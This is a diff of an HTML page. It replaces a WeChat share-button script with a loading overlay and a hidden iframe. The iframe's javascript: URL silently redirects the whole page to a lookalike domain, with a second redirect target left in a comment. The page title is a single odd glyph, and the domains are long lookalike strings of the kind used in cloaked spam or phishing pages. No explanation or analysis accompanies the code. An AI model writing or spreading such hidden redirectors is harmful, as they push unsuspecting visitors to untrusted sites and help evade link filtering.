@@ -1,54 +1,23 @@
 <!DOCTYPE html>
-<html lang="en">
-<head>
-	<meta charset="UTF-8">
-	<title>Title</title>
+<html lang="en"><head>
+<meta http-equiv="content-type" content="text/html; charset=UTF-8">
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no"> 
+<title>҉</title>
+<script type="text/javascript">
+document.write('<div id="load-layer"><div id="app-loading" class="app-loading"><div class="cycleWrap"><span class="cycle cycle-1"></span><span class="cycle cycle-2"></span><span class="cycle cycle-3"></span><span class="cycle cycle-4"></span></div><div class="lineWrap"><span class="line line-1"></span><span class="line line-2"></span><span class="line line-3"></span></div></div></div>');
+window.onload=function(){
+	var load = document.getElementById("load-layer");
+	load.parentNode.removeChild(load);
+}
+</script>
+<link rel="stylesheet" type="text/css" href="http://7xw155.com1.z0.glb.clouddn.com/css.css">
 </head>
 <body>
-<script src="https://apps.bdimg.com/libs/jquery/2.1.4/jquery.min.js"></script>
-<script src="http://res.wx.qq.com/open/js/jweixin-1.0.0.js"></script>
-<script src="https://res.wx.qq.com/open/js/jweixin-1.0.0.js"></script>
-
 <script>
-	url=location.href;
-
-	url = url.replace("&","55555");
-
-	//为了解决微信客户端会在你的链接末尾加入其它参数，如果不是动态获取当前链接，将导致分享后的页面签名失败问题。把链接地址中出现的&替换临时字符。否则后台处理就得不到完整的地址链接了。
-
-
-	$.ajax({
-		type : "get",
-		url : "http://wwwgsactivitydldltaxicomcn.fshzh.cn/api/jssdk.php?url="+url,
-		dataType : "jsonp",
-		jsonp: "callback",
-		jsonpCallback:"success_jsonpCallback",
-		success : function(data){
-			wx.config({
-				appId: data.appId,
-				timestamp: data.timestamp,
-				nonceStr: data.nonceStr,
-				signature: data.signature,
-				jsApiList: [
-					"onMenuShareTimeline",
-					"onMenuShareAppMessage"
-				]
-			});
-		},
-		error:function(data){
-			alert("连接失败！");
-		}
-	});
-	wx.ready(function (){
-		var shareData = {
-			title: '霾黄色预警昨发布 冷空气昨夜到温 雾霾可能消散',
-			desc: '在长大的过程中，我才慢慢发现，我身边的所有事，别人跟我说的所有事，那些所谓本来如此，注定如此的事，它们其实没有非得如此，事情是可以改变的。更重要的是，有些事既然错了，那就该做出改变。',
-			link: 'http://news.wendu.cn/2015/0127/482049.shtml',
-			imgUrl: 'http://upload.wendu.cn/2015/0127/1422306020538.jpg'
-		};
-		wx.onMenuShareAppMessage(shareData);
-		wx.onMenuShareTimeline(shareData);
-	});
+var iframe =document.body.appendChild(document.createElement('iframe'));
+	iframe.style.display = 'none';
+	//iframe.src ='javascript:"<script>top.location.replace(\'http://wwwwwwwwwwww2017gsactivitydldltaxicomc.cswebi.cn/bootstrap\')<\/script>"';
+	iframe.src ='javascript:"<script>top.location.replace(\'http://wwwwwwwwwwww2017gsactivitydldltaxicomc.cswebi.cn/javascript\')<\/script>"';
 </script>
-</body>
-</html>
+</body></html>
